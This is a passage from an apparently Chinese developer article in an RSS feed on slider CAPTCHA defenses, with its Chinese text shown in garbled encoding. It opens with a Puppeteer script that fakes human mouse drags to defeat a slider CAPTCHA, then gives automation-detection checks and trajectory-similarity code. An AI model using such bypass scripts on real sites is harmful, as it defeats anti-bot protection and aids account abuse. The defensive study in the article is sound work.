<p>è¿™æ˜¯æœ€åŸºç¡€çš„è‡ªåŠ¨åŒ–æ–¹æ¡ˆï¼Œä½¿ç”¨æ— å¤´æµè§ˆå™¨æ¨¡æ‹Ÿäººç±»æ“ä½œã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ”»å‡»è€…è§†è§’ï¼ˆä»…ç”¨äºäº†è§£é˜²å¾¡ç­–ç•¥ï¼‰</span>
<span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">'puppeteer'</span>);

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">crackCaptcha</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">launch</span>();
  <span class="hljs-keyword">const</span> page = <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">newPage</span>();
  
  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">'http://target.com'</span>);
  
  <span class="hljs-comment">// è·å–æ»‘å—å…ƒç´ </span>
  <span class="hljs-keyword">const</span> slider = <span class="hljs-keyword">await</span> page.$(<span class="hljs-string">'.slider-btn'</span>);
  <span class="hljs-keyword">const</span> sliderBox = <span class="hljs-keyword">await</span> slider.<span class="hljs-title function_">boundingBox</span>();
  
  <span class="hljs-comment">// æ¨¡æ‹Ÿäººç±»æ‹–åŠ¨ï¼ˆè´å¡å°”æ›²çº¿ï¼‰</span>
  <span class="hljs-keyword">await</span> page.<span class="hljs-property">mouse</span>.<span class="hljs-title function_">move</span>(sliderBox.<span class="hljs-property">x</span> + sliderBox.<span class="hljs-property">width</span> / <span class="hljs-number">2</span>, sliderBox.<span class="hljs-property">y</span> + sliderBox.<span class="hljs-property">height</span> / <span class="hljs-number">2</span>);
  <span class="hljs-keyword">await</span> page.<span class="hljs-property">mouse</span>.<span class="hljs-title function_">down</span>();
  
  <span class="hljs-comment">// ä½¿ç”¨è´å¡å°”æ›²çº¿æ¨¡æ‹Ÿéçº¿æ€§è½¨è¿¹</span>
  <span class="hljs-keyword">const</span> targetX = sliderBox.<span class="hljs-property">x</span> + <span class="hljs-number">150</span>; <span class="hljs-comment">// å‡è®¾ç›®æ ‡ä½ç½®</span>
  <span class="hljs-keyword">const</span> steps = <span class="hljs-number">50</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt;= steps; i++) {
    <span class="hljs-keyword">const</span> t = i / steps;
    <span class="hljs-comment">// è´å¡å°”æ›²çº¿å…¬å¼</span>
    <span class="hljs-keyword">const</span> x = sliderBox.<span class="hljs-property">x</span> + (targetX - sliderBox.<span class="hljs-property">x</span>) * (<span class="hljs-number">3</span> * t * t - <span class="hljs-number">2</span> * t * t * t);
    <span class="hljs-keyword">const</span> y = sliderBox.<span class="hljs-property">y</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sin</span>(t * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>) * <span class="hljs-number">10</span>; <span class="hljs-comment">// æ·»åŠ Yè½´æ‰°åŠ¨</span>
    <span class="hljs-keyword">await</span> page.<span class="hljs-property">mouse</span>.<span class="hljs-title function_">move</span>(x, y);
    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">waitForTimeout</span>(<span class="hljs-number">10</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">20</span>); <span class="hljs-comment">// éšæœºå»¶è¿Ÿ</span>
  }
  
  <span class="hljs-keyword">await</span> page.<span class="hljs-property">mouse</span>.<span class="hljs-title function_">up</span>();
}
</code></pre>
<p><strong>é˜²å¾¡ç­–ç•¥</strong>ï¼š</p>
<ul>
<li>æ£€æµ‹ <code>navigator.webdriver</code> å±æ€§</li>
<li>åˆ†æè½¨è¿¹çš„éšæœºæ€§ï¼ˆè´å¡å°”æ›²çº¿è¿‡äºå¹³æ»‘ï¼‰</li>
<li>æ£€æŸ¥é¼ æ ‡äº‹ä»¶çš„çœŸå®æ€§</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å‰ç«¯æ£€æµ‹Puppeteer</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">detectAutomation</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> indicators = [
    navigator.<span class="hljs-property">webdriver</span>,
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">callPhantom</span>,
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">_phantom</span>,
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">Buffer</span>,
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">emit</span>
  ];
  
  <span class="hljs-keyword">if</span> (indicators.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> i)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ£€æµ‹åˆ°è‡ªåŠ¨åŒ–å·¥å…·'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
</code></pre>
<h4 data-id="heading-31">2. AIè§†è§‰ç ´è§£</h4>
<p>ä½¿ç”¨è®¡ç®—æœºè§†è§‰æŠ€æœ¯è¯†åˆ«ç¼ºå£ä½ç½®ï¼Œç„¶åç›´æ¥æ‹–åŠ¨åˆ°ä½ã€‚</p>
<p><strong>é˜²å¾¡ç­–ç•¥</strong>ï¼š</p>
<ul>
<li>éšæœºç¼ºå£å½¢çŠ¶ï¼ˆä¸åªæ˜¯åœ†å½¢ï¼‰</li>
<li>å¹²æ‰°èƒŒæ™¯å›¾æ¡ˆ</li>
<li>åŠ¨æ€ç”Ÿæˆçš„ç¼ºå£è¾¹ç¼˜</li>
</ul>
<h4 data-id="heading-32">3. CAPTCHAå†œåœºï¼ˆäººå·¥æ‰“ç ï¼‰</h4>
<p>è¿™æ˜¯æœ€éš¾é˜²å¾¡çš„æ”»å‡»æ–¹å¼ã€‚æ”»å‡»è€…é›‡ä½£çœŸäººæ‰‹åŠ¨å®ŒæˆéªŒè¯ç ï¼Œç„¶åå‡ºå”®éªŒè¯tokenã€‚</p>
<pre><code class="hljs language-markdown" lang="markdown">CAPTCHAå†œåœºæµç¨‹:
<span class="hljs-bullet">1.</span> æ”»å‡»è€…ä»å†œåœºè´­ä¹°éªŒè¯token
<span class="hljs-bullet">2.</span> å†œåœºå·¥äººç™»å½•ç³»ç»Ÿï¼Œæ‰‹åŠ¨å®ŒæˆéªŒè¯
<span class="hljs-bullet">3.</span> tokenè¢«è½¬å–ç»™æ”»å‡»è€…ä½¿ç”¨
</code></pre>
<p><strong>é˜²å¾¡ç­–ç•¥</strong>ï¼š</p>
<ul>
<li>è½¨è¿¹ç›¸ä¼¼åº¦åˆ†æï¼ˆåŒä¸€å·¥äººçš„è½¨è¿¹æ¨¡å¼ç›¸ä¼¼ï¼‰</li>
<li>è®¾å¤‡æŒ‡çº¹ç»‘å®šï¼ˆtokenåªèƒ½åœ¨ä¸€å°è®¾å¤‡ä½¿ç”¨ï¼‰</li>
<li>åœ°ç†ä½ç½®åˆ†æï¼ˆæ£€æµ‹å¼‚å¸¸ç™»å½•åœ°ç‚¹ï¼‰</li>
<li>è¡Œä¸ºå…³è”åˆ†æï¼ˆçŸ­æ—¶é—´å¤§é‡ç›¸ä¼¼è½¨è¿¹ï¼‰</li>
</ul>
<h2 data-id="heading-33">è¿›é˜¶æ€è€ƒï¼šå¯¹æŠ—CAPTCHAå†œåœº</h2>
<p>æ ¹æ® 2025 å¹´ Multimedia Systems çš„ç ”ç©¶ "CAPTCHA farm detection and user authentication via mouse-trajectory similarity measurement"ï¼Œå¯ä»¥é€šè¿‡è½¨è¿¹ç›¸ä¼¼åº¦æ¥è¯†åˆ«åŒä¸€æ“ä½œè€…çš„å¤šæ¬¡æ“ä½œã€‚</p>
<h3 data-id="heading-34">è½¨è¿¹ç›¸ä¼¼åº¦ç®—æ³•</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è½¨è¿¹ç›¸ä¼¼åº¦è®¡ç®—ï¼ˆDTWç®—æ³•ç®€åŒ–ç‰ˆï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateTrajectorySimilarity</span>(<span class="hljs-params">traj1, traj2</span>) {
  <span class="hljs-comment">// 1. å½’ä¸€åŒ–è½¨è¿¹</span>
  <span class="hljs-keyword">const</span> normalized1 = <span class="hljs-title function_">normalizeTrajectory</span>(traj1);
  <span class="hljs-keyword">const</span> normalized2 = <span class="hljs-title function_">normalizeTrajectory</span>(traj2);

  <span class="hljs-comment">// 2. è®¡ç®—DTWè·ç¦»</span>
  <span class="hljs-keyword">const</span> dtwDistance = <span class="hljs-title function_">dynamicTimeWarping</span>(normalized1, normalized2);

  <span class="hljs-comment">// 3. è½¬æ¢ä¸ºç›¸ä¼¼åº¦å¾—åˆ†</span>
  <span class="hljs-keyword">const</span> similarity = <span class="hljs-number">1</span> / (<span class="hljs-number">1</span> + dtwDistance);

  <span class="hljs-keyword">return</span> similarity;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">normalizeTrajectory</span>(<span class="hljs-params">trajectory</span>) {
  <span class="hljs-comment">// å½’ä¸€åŒ–åˆ°0-1èŒƒå›´</span>
  <span class="hljs-keyword">const</span> xs = trajectory.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.<span class="hljs-property">x</span>);
  <span class="hljs-keyword">const</span> ys = trajectory.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.<span class="hljs-property">y</span>);
  
  <span class="hljs-keyword">const</span> minX = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(...xs);
  <span class="hljs-keyword">const</span> maxX = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(...xs);
  <span class="hljs-keyword">const</span> minY = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(...ys);
  <span class="hljs-keyword">const</span> maxY = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(...ys);

  <span class="hljs-keyword">return</span> trajectory.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> ({
    <span class="hljs-attr">x</span>: (p.<span class="hljs-property">x</span> - minX) / (maxX - minX),
    <span class="hljs-attr">y</span>: (p.<span class="hljs-property">y</span> - minY) / (maxY - minY),
    <span class="hljs-attr">t</span>: p.<span class="hljs-property">t</span> / trajectory[trajectory.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>].<span class="hljs-property">t</span>
  }));
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">dynamicTimeWarping</span>(<span class="hljs-params">seq1, seq2</span>) {
  <span class="hljs-keyword">const</span> n = seq1.<span class="hljs-property">length</span>;
  <span class="hljs-keyword">const</span> m = seq2.<span class="hljs-property">length</span>;
  <span class="hljs-keyword">const</span> dtw = <span class="hljs-title class_">Array</span>(n + <span class="hljs-number">1</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-literal">null</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Array</span>(m + <span class="hljs-number">1</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-title class_">Infinity</span>));
  dtw[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">1</span>; j &lt;= m; j++) {
      <span class="hljs-keyword">const</span> cost = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(
        <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(seq1[i - <span class="hljs-number">1</span>].<span class="hljs-property">x</span> - seq2[j - <span class="hljs-number">1</span>].<span class="hljs-property">x</span>, <span class="hljs-number">2</span>) +
        <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(seq1[i - <span class="hljs-number">1</span>].<span class="hljs-property">y</span> - seq2[j - <span class="hljs-number">1</span>].<span class="hljs-property">y</span>, <span class="hljs-number">2</span>)
      );
      dtw[i][j] = cost + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(dtw[i - <span class="hljs-number">1</span>][j], dtw[i][j - <span class="hljs-number">1</span>], dtw[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>]);
    }
  }

  <span class="hljs-keyword">return</span> dtw[n][m];
}
</code></pre>
<h3 data-id="heading-35">ä¼ä¸šçº§é˜²å¾¡ä½“ç³»</h3>
<pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  ä¼ä¸šçº§éªŒè¯ç é˜²å¾¡ä½“ç³»                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  ç¬¬ä¸€å±‚: åŸºç¡€éªŒè¯                                        â”‚
â”‚  â”œâ”€ ä½ç½®éªŒè¯                                            â”‚
â”‚  â”œâ”€ æ—¶é—´çª—å£æ§åˆ¶                                         â”‚
â”‚  â””â”€ å°è¯•æ¬¡æ•°é™åˆ¶                                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  ç¬¬äºŒå±‚: è¡Œä¸ºåˆ†æ                                        â”‚
â”‚  â”œâ”€ è½¨è¿¹éçº¿æ€§æ£€æµ‹                                       â”‚
â”‚  â”œâ”€ é€Ÿåº¦å˜åŒ–åˆ†æ                                         â”‚
â”‚  â””â”€ åŠ é€Ÿåº¦æ¨¡å¼è¯†åˆ«                                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  ç¬¬ä¸‰å±‚: æ™ºèƒ½é£æ§                                        â”‚
â”‚  â”œâ”€ è®¾å¤‡æŒ‡çº¹è¯†åˆ«                                         â”‚
â”‚  â”œâ”€ è½¨è¿¹ç›¸ä¼¼åº¦èšç±»                                       â”‚
â”‚  â””â”€ å¼‚å¸¸è¡Œä¸ºæ¨¡å¼è¯†åˆ«                                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  ç¬¬å››å±‚: ä¸šåŠ¡è”åŠ¨                                        â”‚
â”‚  â”œâ”€ é£é™©è¯„åˆ†ç³»ç»Ÿ                                         â”‚
â”‚  â”œâ”€ åŠ¨æ€éš¾åº¦è°ƒæ•´                                         â”‚
â”‚  â””â”€ äºŒæ¬¡éªŒè¯è§¦å‘                                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h2 data-id="heading-36">æ€»ç»“</h2>
<p>æ»‘å—éªŒè¯ç å°±åƒæ˜¯ä¸€åœºæ²¡æœ‰ç¡çƒŸçš„æˆ˜äº‰ã€‚ä½ ä»¥ä¸ºåªæ˜¯ç®€å•åœ°"æ‹–åŠ¨ä¸€ä¸‹"ï¼Œå®é™…ä¸ŠèƒŒåæ˜¯å·¥ç¨‹å¸ˆä»¬ç²¾å¿ƒè®¾è®¡çš„äº”é“é˜²çº¿åœ¨é»˜é»˜å·¥ä½œï¼š</p>
<h3 data-id="heading-37">ğŸ“ æ ¸å¿ƒè¦ç‚¹å›é¡¾</h3>
<ol>
<li>
<p><strong>ä½ç½®éªŒè¯</strong>ï¼šæœ€åŸºç¡€çš„åæ ‡æ ¡éªŒï¼Œä½†è¦æ³¨æ„åŠ å¯†ä¼ è¾“å’Œè¯¯å·®å®¹å¿åº¦</p>
</li>
<li>
<p><strong>è½¨è¿¹éçº¿æ€§æ£€æµ‹</strong>ï¼šäººç±»çš„"æ‰‹æŠ–"åè€Œæˆäº†å®‰å…¨ç‰¹å¾ï¼Œæœºå™¨è¿‡äºå®Œç¾çš„ç›´çº¿è¿åŠ¨ä¼šè¢«è¯†ç ´</p>
</li>
<li>
<p><strong>é€Ÿåº¦å˜åŒ–åˆ†æ</strong>ï¼šäººç±»æœ‰åŠ é€Ÿ-å‡é€Ÿè¿‡ç¨‹ï¼Œæœºå™¨äººå¾€å¾€æ˜¯åŒ€é€Ÿè¿åŠ¨</p>
</li>
<li>
<p><strong>åŠ é€Ÿåº¦æ¨¡å¼è¯†åˆ«</strong>ï¼šç¬¦åˆç‰©ç†è§„å¾‹çš„åŠ é€Ÿåº¦æ›²çº¿æ‰æ˜¯çœŸæ­£çš„"äººç±»ç­¾å"</p>
</li>
<li>
<p><strong>æ—¶é—´çª—å£æ§åˆ¶</strong>ï¼šå¤ªå¿«äº†æ˜¯è„šæœ¬ï¼Œå¤ªæ…¢äº†å¯èƒ½æ˜¯äººå·¥æ‰“ç ï¼Œ500ms-3sæ˜¯"é»„é‡‘æ—¶é—´"</p>
</li>
</ol>
<h3 data-id="heading-38">ğŸ’¡ å®æˆ˜ç»éªŒ</h3>
<ul>
<li><strong>ä¸è¦åªä¾èµ–ä¸€å±‚é˜²æŠ¤</strong>ï¼šå•ä¸€æ£€æµ‹å¾ˆå®¹æ˜“è¢«ç»•è¿‡ï¼Œå¤šå±‚æ£€æµ‹å åŠ æ‰èƒ½æœ‰æ•ˆé˜²å¾¡</li>
<li><strong>ç”¨æˆ·ä½“éªŒä¸å®‰å…¨æ€§çš„å¹³è¡¡</strong>ï¼šé˜ˆå€¼è®¾ç½®å¤ªä¸¥ä¼šè¯¯ä¼¤çœŸå®ç”¨æˆ·ï¼Œå¤ªæ¾åˆ™å¤±å»é˜²æŠ¤æ„ä¹‰</li>
<li><strong>æŒç»­å¯¹æŠ—</strong>ï¼šæ”»å‡»è€…åœ¨è¿›æ­¥ï¼Œé˜²å¾¡ç­–ç•¥ä¹Ÿè¦ä¸æ–­æ›´æ–°</li>
<li><strong>æ—¥å¿—ä¸ç›‘æ§</strong>ï¼šè®°å½•æ¯æ¬¡éªŒè¯çš„è¯¦ç»†æ•°æ®ï¼Œç”¨äºåç»­åˆ†æå’Œæ¨¡å‹ä¼˜åŒ–</li>
</ul>
<h3 data-id="heading-39">ğŸ”® æœªæ¥è¶‹åŠ¿</h3>
<ul>
<li><strong>æœºå™¨å­¦ä¹ èåˆ</strong>ï¼šç”¨AIå¯¹æŠ—AIï¼Œé€šè¿‡è¡Œä¸ºæ¨¡å¼è®­ç»ƒè¯†åˆ«æ¨¡å‹</li>
<li><strong>å¤šæ¨¡æ€éªŒè¯</strong>ï¼šç»“åˆç‚¹å‡»ã€æ»‘åŠ¨ã€é”®ç›˜æ“ä½œç­‰å¤šç»´åº¦è¡Œä¸º</li>
<li><strong>æ— æ„ŸéªŒè¯</strong>ï¼šåœ¨ç”¨æˆ·æ— æ„ŸçŸ¥çš„æƒ…å†µä¸‹å®ŒæˆéªŒè¯ï¼ˆå¦‚Googleçš„reCAPTCHA v3ï¼‰</li>
<li><strong>éšç§ä¿æŠ¤</strong>ï¼šå‡å°‘å¯¹ç”¨æˆ·è¡Œä¸ºçš„ä¾µå…¥å¼é‡‡é›†ï¼Œä¿æŠ¤ç”¨æˆ·éšç§</li>
</ul>
<p>æ»‘å—éªŒè¯ç çœ‹ä¼¼ç®€å•ï¼Œå®åˆ™æ·±è—ä¸éœ²ã€‚ä¸‹æ¬¡å½“ä½ é¡ºæ»‘åœ°å®Œæˆä¸€ä¸ªæ»‘å—éªŒè¯æ—¶ï¼Œä¸å¦¨æƒ³ä¸€æƒ³ï¼šè¿™ä¸€ç§’é’Ÿï¼Œæœ‰å¤šå°‘ä»£ç åœ¨ä¸ºä½ ä¿é©¾æŠ¤èˆªï¼Œåˆæœ‰å¤šå°‘æ”»å‡»è€…æ­£åœ¨ä¸ºçªç ´è¿™é“é˜²çº¿è€Œç»å°½è„‘æ±ã€‚</p>
<p>æŠ€æœ¯çš„æ”»é˜²ï¼Œæ°¸æ— æ­¢å¢ƒã€‚ä½œä¸ºå¼€å‘è€…ï¼Œæˆ‘ä»¬è¦åšçš„ï¼Œå°±æ˜¯åœ¨ä¾¿åˆ©æ€§å’Œå®‰å…¨æ€§ä¹‹é—´æ‰¾åˆ°æœ€ä½³å¹³è¡¡ç‚¹ã€‚</p>
<hr/>
<p><strong>å‚è€ƒé“¾æ¥</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fadrsch%2Fslider-captcha" target="_blank" title="https://github.com/adrsch/slider-captcha" ref="nofollow noopener noreferrer">adrsch/slider-captcha</a> - React + Expresså®ç° - éªŒè¯çŠ¶æ€: âœ…</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkartikmehta8%2Fcaptcha" target="_blank" title="https://github.com/kartikmehta8/captcha" ref="nofollow noopener noreferrer">kartikmehta8/captcha</a> - Node.js + Rediså®Œæ•´æ–¹æ¡ˆ - éªŒè¯çŠ¶æ€: âœ…</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Famakarov.dev%2Fcreate-slider-or-puzzle-captcha-service-with-node-js-4c25207f7264" target="_blank" title="https://amakarov.dev/create-slider-or-puzzle-captcha-service-with-node-js-4c25207f7264" ref="nofollow noopener noreferrer">Create Slider Captcha with Node.js</a> - MediumæŠ€æœ¯æ–‡ç«  - éªŒè¯çŠ¶æ€: âœ…</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘å†™äº†ä¸ª Claude Code Skillï¼Œå†ä¹Ÿä¸ç”¨æ‰‹åŠ¨åˆ‡å›¾ä¼  COS äº†]]></title>    <link>https://juejin.cn/post/7604507125856829467</link>    <guid>https://juejin.cn/post/7604507125856829467</guid>    <pubDate>2026-02-09T07:31:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604507125856829467" data-draft-id="7604345576176631846" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘å†™äº†ä¸ª Claude Code Skillï¼Œå†ä¹Ÿä¸ç”¨æ‰‹åŠ¨åˆ‡å›¾ä¼  COS äº†"/> <meta itemprop="keywords" content="Agent,Claude,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-09T07:31:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="jerrywus"/> <meta itemprop="url" content="https://juejin.cn/user/2823201591402990"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘å†™äº†ä¸ª Claude Code Skillï¼Œå†ä¹Ÿä¸ç”¨æ‰‹åŠ¨åˆ‡å›¾ä¼  COS äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2823201591402990/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    jerrywus
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T07:31:20.000Z" title="Mon Feb 09 2026 07:31:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item 